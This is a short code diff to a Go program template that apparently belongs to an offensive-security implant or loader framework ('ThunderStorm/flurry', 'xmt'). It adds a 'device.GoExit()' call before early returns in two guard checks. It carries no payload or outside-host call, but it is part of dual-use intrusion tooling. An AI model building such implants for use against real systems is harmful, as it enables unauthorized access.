@@ -22,6 +22,7 @@ import (
 
 	"github.com/iDigitalFlame/ThunderStorm/flurry"
 	"github.com/iDigitalFlame/xmt/data/crypto"
+	"github.com/iDigitalFlame/xmt/device"
 	"github.com/iDigitalFlame/xmt/man"
 )
 
@@ -42,6 +43,7 @@ var x = [...]byte{
 func main() {
 	// NOTE(dij): Only ran if non-CGO or CGO main is called.
 	if $checks {
+		device.GoExit()
 		return
 	}
 	// NOTE(dij): "os.Args" Will only work if non-CGO, GO-CGO cannot access argv.
@@ -64,6 +66,7 @@ func main() {
 func secondary() {
 	// NOTE(dij): Reserved for CGO secondary functions.
 	if $checks {
+		device.GoExit()
 		return
 	}
 	flurry.Loop(
